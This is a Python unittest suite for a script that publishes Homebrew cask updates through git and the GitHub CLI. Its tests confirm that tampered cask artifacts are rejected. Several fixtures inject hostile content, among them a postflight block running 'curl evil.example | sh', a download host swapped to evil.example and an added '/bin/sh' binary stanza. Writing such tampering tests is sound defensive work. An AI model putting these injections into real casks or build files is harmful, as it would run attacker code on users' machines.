#!/usr/bin/env python3
import os
from pathlib import Path
import re
import shutil
import subprocess
import tempfile
import unittest


HERE = Path(__file__).resolve().parent
SCRIPT = HERE / "publish-mouthtype-cask.sh"
REAL_CASK = HERE.parent / "Casks/mouthtype.rb"
CREDENTIAL = "s3cret-credential-value"
NEW_SHA = "a" * 64
ERR_CHANGED = "changed more than version and sha256"

# Stub git: everything goes to the real git except push and fetch. Pushes are
# logged with their argv and answered with PUSH_EXIT, except that the first push
# of a run answers PUSH_FIRST_EXIT when set (a rejected first push).
GIT_STUB = """#!/usr/bin/env bash
for arg in "$@"; do
  if [ "$arg" = fetch ]; then
    exit 0
  fi
  if [ "$arg" = push ]; then
    first=1
    [ -s "$PUSH_LOG" ] && first=0
    echo "$*" >> "$PUSH_LOG"
    if [ "$first" = 1 ] && [ -n "${PUSH_FIRST_EXIT:-}" ]; then
      exit "$PUSH_FIRST_EXIT"
    fi
    exit "${PUSH_EXIT:-0}"
  fi
done
exec "$REAL_GIT" "$@"
"""

# Stub gh: records argv. `pr list` prints GH_PR_LIST (an existing PR number, or
# nothing), `pr create` prints a PR URL, `pr merge` answers GH_MERGE_EXIT.
GH_STUB = """#!/usr/bin/env bash
echo "$*" >> "$GH_LOG"
case "$1 $2" in
  "pr list") [ -n "${GH_PR_LIST:-}" ] && echo "$GH_PR_LIST"; exit 0 ;;
  "pr create") echo "https://github.com/CodesWhat/homebrew-tap/pull/7"; exit 0 ;;
  "pr merge") exit "${GH_MERGE_EXIT:-0}" ;;
esac
exit 0
"""


def make_artifact(text=None, version="0.12.3", sha=NEW_SHA):
    """The current cask with a new version and sha256, optionally post-edited."""
    cask = REAL_CASK.read_text()
    cask = re.sub(r'(?m)^(  version ")[^"]*(")$', rf"\g<1>{version}\2", cask)
    cask = re.sub(r'(?m)^(  sha256 ")[^"]*(")$', rf"\g<1>{sha}\2", cask)
    return cask if text is None else text(cask)


class PublishTests(unittest.TestCase):
    def publish(self, artifact, version="0.12.3", push_exit=0, missing=False,
                push_first_exit="", pr_list="", merge_exit=0):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "scripts").mkdir()
            shutil.copy(SCRIPT, root / "scripts/publish-mouthtype-cask.sh")
            shutil.copy(HERE / "open-cask-pr.sh", root / "scripts/open-cask-pr.sh")
            (root / "Casks").mkdir()
            shutil.copy(REAL_CASK, root / "Casks/mouthtype.rb")
            real_git = shutil.which("git")
            env = dict(
                os.environ,
                GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@example.com",
                GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@example.com",
                GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_SYSTEM="/dev/null")
            for cmd in (["init", "-q", "-b", "main"], ["add", "-A"],
                        ["commit", "-q", "-m", "init"]):
                subprocess.run([real_git, *cmd], cwd=root, env=env, check=True)
            (root / "bin").mkdir()
            stub = root / "bin/git"
            stub.write_text(GIT_STUB)
            stub.chmod(0o755)
            gh = root / "bin/gh"
            gh.write_text(GH_STUB)
            gh.chmod(0o755)
            (root / "out").mkdir()
            src = root / "out/mouthtype.rb"
            if not missing:
                src.write_text(artifact)
            push_log = root / "push.log"
            gh_log = root / "gh.log"
            env.update(
                PATH=f"{root / 'bin'}:{os.environ['PATH']}",
                REAL_GIT=real_git, PUSH_LOG=str(push_log),
                PUSH_EXIT=str(push_exit), PUSH_FIRST_EXIT=str(push_first_exit),
                GH_LOG=str(gh_log), GH_PR_LIST=pr_list,
                GH_MERGE_EXIT=str(merge_exit), VERSION=version,
                GITHUB_TOKEN=CREDENTIAL, CASK_ARTIFACT=str(src),
                RUNNER_TEMP=str(root / "nonexistent"))
            result = subprocess.run(
                ["bash", "scripts/publish-mouthtype-cask.sh"], cwd=root,
                env=env, capture_output=True, text=True)
            count = subprocess.run(
                [real_git, "rev-list", "--count", "HEAD"], cwd=root, env=env,
                capture_output=True, text=True, check=True).stdout.strip()
            subject = subprocess.run(
                [real_git, "log", "-1", "--format=%s"], cwd=root, env=env,
                capture_output=True, text=True, check=True).stdout.strip()
            branch = subprocess.run(
                [real_git, "rev-parse", "--abbrev-ref", "HEAD"], cwd=root,
                env=env, capture_output=True, text=True, check=True).stdout.strip()
            return {
                "branch": branch,
                "result": result,
                "commits": int(count),
                "subject": subject,
                "pushed": push_log.exists(),
                "pushes": push_log.read_text().splitlines() if push_log.exists() else [],
                "gh": gh_log.read_text().splitlines() if gh_log.exists() else [],
                "cask": (root / "Casks/mouthtype.rb").read_text(),
                "gitconfig": (root / ".git/config").read_text(),
            }

    def assert_rejected(self, out, message=None):
        self.assertEqual(out["result"].returncode, 1, out["result"].stdout + out["result"].stderr)
        self.assertEqual(out["commits"], 1)
        self.assertFalse(out["pushed"])
        self.assertEqual(out["gh"], [])
        if message:
            self.assertIn(message, out["result"].stdout + out["result"].stderr)

    def test_valid_update_is_committed_and_pushed(self):
        artifact = make_artifact()
        out = self.publish(artifact)
        self.assertEqual(out["result"].returncode, 0, out["result"].stderr)
        self.assertEqual(out["commits"], 2)
        self.assertEqual(out["subject"], "build(cask): update mouthtype to 0.12.3")
        self.assertTrue(out["pushed"])
        self.assertEqual(out["cask"], artifact)
        self.assertNotIn(CREDENTIAL, out["gitconfig"])
        branch = "mouthtype/v0.12.3"
        self.assertEqual(len(out["pushes"]), 1)
        self.assertIn(f"refs/heads/{branch}:refs/heads/{branch}", out["pushes"][0])
        self.assertNotIn("main", out["pushes"][0])
        self.assertNotIn("force", out["pushes"][0])
        self.assertEqual(out["branch"], branch)
        self.assertEqual(self.calls(out, "pr create"), 1)
        self.assertEqual(self.calls(out, f"workflow run cask-ci.yml --ref {branch}"), 1)
        self.assertEqual(self.calls(out, "pr merge 7 --auto --squash"), 1)
        create = next(g for g in out["gh"] if g.startswith("pr create"))
        self.assertIn("--title build(cask): update mouthtype to 0.12.3", create)
        self.assertIn("--base main", create)

    def calls(self, out, prefix):
        return sum(1 for g in out["gh"] if g.startswith(prefix))

    def test_existing_pr_is_reused(self):
        out = self.publish(make_artifact(), pr_list="12")
        self.assertEqual(out["result"].returncode, 0, out["result"].stderr)
        self.assertEqual(self.calls(out, "pr create"), 0)
        self.assertEqual(self.calls(out, "workflow run cask-ci.yml --ref mouthtype/v0.12.3"), 1)
        self.assertEqual(self.calls(out, "pr merge 12 --auto --squash"), 1)

    def test_rejected_push_retries_with_lease_on_the_mouthtype_branch(self):
        out = self.publish(make_artifact(), push_first_exit=1)
        self.assertEqual(out["result"].returncode, 0, out["result"].stderr)
        self.assertEqual(len(out["pushes"]), 2)
        self.assertNotIn("force", out["pushes"][0])
        lease = out["pushes"][1]
        self.assertIn("--force-with-lease=refs/heads/mouthtype/v0.12.3:", lease)
        self.assertIn("refs/heads/mouthtype/v0.12.3:refs/heads/mouthtype/v0.12.3", lease)
        for push in out["pushes"]:
            self.assertNotIn("main", push)

    def test_auto_merge_failure_warns_and_keeps_the_pr(self):
        out = self.publish(make_artifact(), merge_exit=1)
        self.assertEqual(out["result"].returncode, 0, out["result"].stderr)
        self.assertIn("::warning::", out["result"].stdout)
        self.assertEqual(self.calls(out, "pr create"), 1)

    def test_identical_artifact_is_a_noop(self):
        current = re.search(r'(?m)^  version "([^"]*)"$', REAL_CASK.read_text()).group(1)
        out = self.publish(REAL_CASK.read_text(), version=current)
        self.assertEqual(out["result"].returncode, 0, out["result"].stderr)
        self.assertIn("nothing to commit", out["result"].stdout)
        self.assertEqual(out["commits"], 1)
        self.assertFalse(out["pushed"])
        self.assertEqual(out["gh"], [])

    def test_missing_artifact(self):
        self.assert_rejected(self.publish("", missing=True), "missing")

    def test_bad_version(self):
        for bad in ("0.12", "v0.12.3", "0.12.3-rc.1", "", "0.12.3\n0.1.0"):
            with self.subTest(version=bad):
                self.assert_rejected(
                    self.publish(make_artifact(version=bad or "0.12.3"), version=bad))

    def test_version_mismatch(self):
        self.assert_rejected(self.publish(make_artifact(version="0.12.4")))

    def test_malformed_sha256(self):
        for sha in ("A" * 64, "a" * 63, "a" * 65, "g" * 64, ""):
            with self.subTest(sha=sha):
                self.assert_rejected(self.publish(make_artifact(sha=sha)))

    def test_added_postflight_block(self):
        art = make_artifact(lambda c: c.replace(
            '  app "Mouthtype.app"\n',
            '  app "Mouthtype.app"\n\n  postflight do\n    system "curl evil.example | sh"\n  end\n'))
        self.assert_rejected(self.publish(art), ERR_CHANGED)

    def test_changed_url_host(self):
        art = make_artifact(lambda c: c.replace(
            "https://github.com/", "https://evil.example/"))
        self.assert_rejected(self.publish(art), ERR_CHANGED)

    def test_extra_stanza(self):
        art = make_artifact(lambda c: c.replace(
            '  name "Mouthtype"\n', '  name "Mouthtype"\n  binary "/bin/sh"\n'))
        self.assert_rejected(self.publish(art), ERR_CHANGED)

    def test_duplicate_version_line(self):
        art = make_artifact(lambda c: c.replace(
            '  version "0.12.3"\n', '  version "0.12.3"\n  version "0.12.3"\n'))
        self.assert_rejected(self.publish(art))

    def test_header_comment_changed(self):
        art = make_artifact(lambda c: c.replace("DO NOT EDIT.", "DO NOT EDIT!"))
        self.assert_rejected(self.publish(art), ERR_CHANGED)

    def test_push_failure(self):
        out = self.publish(make_artifact(), push_exit=1)
        self.assertNotEqual(out["result"].returncode, 0)


if __name__ == "__main__":
    unittest.main()
